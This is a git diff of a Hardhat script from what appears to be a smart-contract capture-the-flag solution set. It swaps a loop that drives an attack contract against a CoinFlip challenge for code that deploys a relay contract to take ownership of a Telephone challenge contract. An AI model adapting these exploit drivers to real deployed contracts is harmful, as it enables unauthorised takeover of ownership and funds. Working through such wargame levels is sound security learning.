@@ -6,22 +6,17 @@
 import { ethers } from "hardhat";
 
 async function main() {
-  // get coinflip contract
-  const coinflip = await ethers.getContractAt("CoinFlip", "0xC96dB99f60e0952Ca0fE5a4C8b25d6a32415DcC1");
+  // get telephone contract
+  const telephone = await ethers.getContractAt("Telephone", "0xc8aCD399f7FEbEC1f2c5704482DF789EEC4F3E1F");
 
   // deploy attack contract
-  const Attack = await ethers.getContractFactory("Attack");
-  const attack = await Attack.deploy(coinflip.address);
-  console.log(`ATTACK deployed`)
+  const TelephoneProxy = await ethers.getContractFactory("TelephoneProxy");
+  const telephoneProxy = await TelephoneProxy.deploy(telephone.address);
+  console.log(`Telephone Proxy Deployed`)
 
-
-  await attack.deployed();
-  for (let i = 0; i < 10; i++) {
-    const attackTx = await attack.attack();
-    attackTx.wait(4)
-    console.log(`ATTACK number - ${i + 1}`)
-  }
-  console.log(`ATTACK finished`)
+  // change owner
+  const attackTx = await telephoneProxy.attack()
+  attackTx.wait(4)
 }
 
 // We recommend this pattern to be able to use async/await everywhere
